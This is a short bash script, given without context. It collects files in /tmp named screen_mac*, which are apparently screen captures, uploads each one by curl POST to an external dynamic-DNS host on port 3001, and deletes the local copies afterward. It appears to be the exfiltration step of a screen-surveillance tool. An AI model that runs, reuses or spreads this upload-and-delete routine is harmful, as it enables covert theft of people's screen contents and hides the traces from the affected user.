#!/bin/bash

echo $(date) > /tmp/screen_mac_date.txt

sleep 2

find /tmp/ -name screen_mac* -type f -print | while read -r file ; do 
  echo "uploading $file"
  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
  # sleep 1
  rm $file 
done
